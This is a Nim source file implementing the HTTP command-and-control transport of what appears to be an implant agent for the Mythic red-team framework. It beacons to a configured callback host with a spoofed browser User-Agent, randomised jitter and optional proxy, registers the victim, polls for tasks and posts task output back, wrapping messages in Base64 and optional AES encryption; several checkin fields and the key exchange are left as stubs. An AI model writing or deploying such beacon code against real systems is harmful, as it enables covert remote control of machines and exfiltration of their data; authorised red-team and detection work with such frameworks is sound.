## httpx_profile.nim
## Pure Nim implementation of Mythic's httpx C2 profile
## NO PYTHON DEPENDENCIES - Uses native Nim HTTP client

import httpclient, asyncdispatch, json, strutils, times, base64, random
import config  # Same directory (utils/)
import crypto  # Same directory (utils/)

type
  HttpxProfile* = ref object
    client: AsyncHttpClient
    baseUrl: string
    getUri: string
    postUri: string
    queryPathName: string
    headers: seq[(string, string)]
    proxyUrl: string
    callbackInterval: int
    callbackJitter: int
    lastCheckin: DateTime
    uuid: string
    encryptionKey: string
    useEncryption: bool

proc newHttpxProfile*(uuid: string): HttpxProfile =
  ## Creates a new httpx profile instance
  result = HttpxProfile()
  result.uuid = uuid
  
  # Initialize from config
  result.baseUrl = CALLBACK_HOST & ":" & $CALLBACK_PORT
  result.getUri = GET_URI
  result.postUri = POST_URI
  result.queryPathName = QUERY_PATH_NAME
  result.callbackInterval = CALLBACK_INTERVAL
  result.callbackJitter = CALLBACK_JITTER
  result.useEncryption = ENCRYPTED_EXCHANGE_CHECK
  
  # Build full URL
  var scheme = if CALLBACK_PORT == 443: "https://" else: "http://"
  if not result.baseUrl.startsWith("http"):
    result.baseUrl = scheme & result.baseUrl
  
  # Setup headers
  result.headers = @[]
  when defined(HTTPX_HEADERS):
    # Parse headers from config
    const headersJson = HEADERS
    try:
      let headerDict = parseJson(headersJson)
      for key, val in headerDict.pairs:
        result.headers.add((key, val.getStr()))
    except:
      discard
  
  # Always add User-Agent if not present
  var hasUserAgent = false
  for (k, v) in result.headers:
    if k.toLowerAscii() == "user-agent":
      hasUserAgent = true
      break
  
  if not hasUserAgent:
    result.headers.add(("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"))
  
  # Setup proxy if configured
  when defined(DEFAULT_PROXY) and DEFAULT_PROXY:
    if PROXY_HOST.len > 0:
      result.proxyUrl = "http://"
      if PROXY_USER.len > 0:
        result.proxyUrl.add(PROXY_USER & ":" & PROXY_PASS & "@")
      result.proxyUrl.add(PROXY_HOST)
      if PROXY_PORT.len > 0:
        result.proxyUrl.add(":" & PROXY_PORT)
  
  # Initialize HTTP client
  if result.proxyUrl.len > 0:
    let proxy = newProxy(result.proxyUrl)
    result.client = newAsyncHttpClient(proxy = proxy)
  else:
    result.client = newAsyncHttpClient()
  
  # Add headers to client
  for (key, val) in result.headers:
    result.client.headers[key] = val
  
  result.lastCheckin = now()

proc calculateJitter(profile: HttpxProfile): int =
  ## Calculate jittered sleep time
  let jitterPercent = profile.callbackJitter.float / 100.0
  let jitterAmount = (profile.callbackInterval.float * jitterPercent).int
  let minSleep = profile.callbackInterval - jitterAmount
  let maxSleep = profile.callbackInterval + jitterAmount
  
  randomize()
  result = rand(minSleep..maxSleep)

proc encryptMessage(profile: HttpxProfile, message: string): string =
  ## Encrypt message using AES256 if encryption is enabled
  when defined(AESPSK):
    if profile.useEncryption and profile.encryptionKey.len > 0:
      return encryptAES256(message, profile.encryptionKey)
    else:
      return message
  else:
    return message

proc decryptMessage(profile: HttpxProfile, message: string): string =
  ## Decrypt message using AES256 if encryption is enabled
  when defined(AESPSK):
    if profile.useEncryption and profile.encryptionKey.len > 0:
      return decryptAES256(message, profile.encryptionKey)
    else:
      return message
  else:
    return message

proc buildAgentMessage(profile: HttpxProfile, message: JsonNode): string =
  ## Build the agent message in Mythic format: Base64(UUID + encrypted_message)
  let msgStr = $message
  let encryptedMsg = profile.encryptMessage(msgStr)
  let combined = profile.uuid & encryptedMsg
  result = encode(combined)

proc parseServerResponse(profile: HttpxProfile, response: string): JsonNode =
  ## Parse server response (Base64 encoded, possibly encrypted)
  try:
    let decoded = decode(response)
    # Response format: Base64(UUID + encrypted_message)
    # Skip UUID (first 36 chars) and decrypt remaining
    if decoded.len > 36:
      let encryptedPart = decoded[36..^1]
      let decrypted = profile.decryptMessage(encryptedPart)
      result = parseJson(decrypted)
    else:
      result = newJObject()
  except:
    result = newJObject()

proc checkin*(profile: HttpxProfile): Future[JsonNode] {.async.} =
  ## Perform initial checkin/registration with Mythic
  var checkinData = %* {
    "action": "checkin",
    "uuid": profile.uuid,
    "ips": @["0.0.0.0"],  # Populate with real IPs
    "os": when defined(windows): "Windows" else: "Linux",
    "user": "unknown",  # Populate with real user
    "host": "unknown",  # Populate with real hostname
    "pid": 0,  # Populate with real PID
    "architecture": when defined(amd64): "x64" else: "x86",
    "domain": "",
    "integrity_level": 2,
    "external_ip": "",
    "encryption_key": "",
    "decryption_key": ""
  }
  
  # If encryption is enabled, include key exchange
  when defined(AESPSK):
    if profile.useEncryption:
      # Generate and include encryption keys
      # This should be implemented with proper RSA key exchange
      checkinData["encryption_key"] = ""  # Base64 encoded public key
      checkinData["decryption_key"] = ""  # Base64 encoded public key
  
  let agentMsg = profile.buildAgentMessage(checkinData)
  
  try:
    # POST to checkin endpoint
    let url = profile.baseUrl & profile.postUri
    let response = await profile.client.post(url, body = agentMsg)
    let body = await response.body
    
    if response.code == Http200:
      result = profile.parseServerResponse(body)
      
      # Extract encryption key if provided
      when defined(AESPSK):
        if result.hasKey("session_key"):
          profile.encryptionKey = result["session_key"].getStr()
    else:
      result = newJObject()
  except:
    result = newJObject()

proc getTasking*(profile: HttpxProfile): Future[seq[JsonNode]] {.async.} =
  ## Poll Mythic for new tasks via GET request
  result = @[]
  
  # Check if we should sleep based on jitter
  let sleepTime = profile.calculateJitter()
  await sleepAsync(sleepTime * 1000)
  
  try:
    # Build GET request with message in query parameter or header
    let getTaskingMsg = %* {
      "action": "get_tasking",
      "tasking_size": CHUNK_SIZE
    }
    
    let agentMsg = profile.buildAgentMessage(getTaskingMsg)
    
    # Add message to query parameter
    var url = profile.baseUrl & profile.getUri
    if profile.queryPathName.len > 0:
      url.add("?" & profile.queryPathName & "=" & agentMsg)
    
    let response = await profile.client.get(url)
    let body = await response.body
    
    if response.code == Http200 and body.len > 0:
      let parsed = profile.parseServerResponse(body)
      
      if parsed.hasKey("tasks") and parsed["tasks"].kind == JArray:
        for task in parsed["tasks"].items:
          result.add(task)
    
    profile.lastCheckin = now()
  except:
    discard

proc postResponse*(profile: HttpxProfile, taskId: string, response: JsonNode): Future[bool] {.async.} =
  ## Send task response back to Mythic via POST
  result = false
  
  try:
    let responseData = %* {
      "action": "post_response",
      "responses": [
        {
          "task_id": taskId,
          "user_output": response
        }
      ]
    }
    
    let agentMsg = profile.buildAgentMessage(responseData)
    let url = profile.baseUrl & profile.postUri
    
    let httpResponse = await profile.client.post(url, body = agentMsg)
    
    if httpResponse.code == Http200:
      result = true
  except:
    result = false

proc close*(profile: HttpxProfile) =
  ## Cleanup resources
  profile.client.close()
